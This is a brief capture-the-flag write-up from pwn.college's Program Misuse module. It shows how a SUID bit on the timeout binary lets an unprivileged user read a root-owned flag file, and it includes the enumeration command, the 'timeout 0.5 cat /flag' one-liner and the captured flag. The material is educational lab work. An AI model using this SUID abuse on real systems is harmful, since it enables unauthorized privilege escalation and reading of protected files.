---
layout: page
title: "Challenge Name: timeout"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/timeout`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/timeout
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/timeout
```

-The `s` in `-rws` indicates it's a SUID binary.
-`timeout` runs with **root privileges**.

## 🚀 Exploitation

The `timeout` command in Linux is used to run another command with a time limit. If the command runs longer than the specified time, timeout will terminate it automatically.


```bash
timeout 0.5 cat /flag
```

Output:
```
pwn.college{MFU1eR7KxcZ2LfT0Uxiy-ybYB9g.dBzNxwSM0IzMyEzW}
```

      
